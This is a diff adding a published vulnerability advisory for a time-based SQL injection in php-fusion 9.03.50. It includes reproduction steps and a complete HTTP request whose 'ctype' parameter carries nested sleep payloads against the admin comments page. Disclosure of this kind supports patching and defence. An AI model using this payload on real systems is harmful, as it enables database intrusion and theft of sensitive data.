@@ -1,0 +1,36 @@
+# Exploit Title: php-fusion 9.03.50 - 'ctype' SQL Injection
+# Exploit Author: SunCSR (Sun* Cyber Security Research - ThienNV)
+# Date: 2020-05-19
+# Vendor Homepage: https://www.php-fusion.co.uk/
+# Software Link: https://www.php-fusion.co.uk/php_fusion_9_downloads.php
+# Version: 9.03.50
+# Tested On: Windows 10 + XAMPP 7.4.5
+
+###Describe the bug
+I've identified an SQL injection vulnerability in the php-fusion 9.03.50 that affects the endpoint /php-fusion/administration/comments.php and can be exploited via the ctype param.
+
+
+###To Reproduce
+Steps to reproduce the behavior:
+
+1. Go to login as admin
+2. Go to Content Admin -> Comments
+3. Filter comments
+
+###POC:
+Send the following HTTP request (With sleep=3s):
+
+GET /php-fusion/administration/comments.php?aid=fee32dbfde52e8ad&ctype=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/ HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,vi-VN;q=0.8,vi;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+
+Result: Server to sleep for 3+3+3=9 seconds
+
+###Impact
+An attacker can manipulate the SQL statements that are sent to the MySQL database and inject malicious SQL statements. The attacker is able to change the logic of SQL statements executed against the database or extract sensitive information
+
+### Reference
+https://github.com/php-fusion/PHP-Fusion/issues/2327
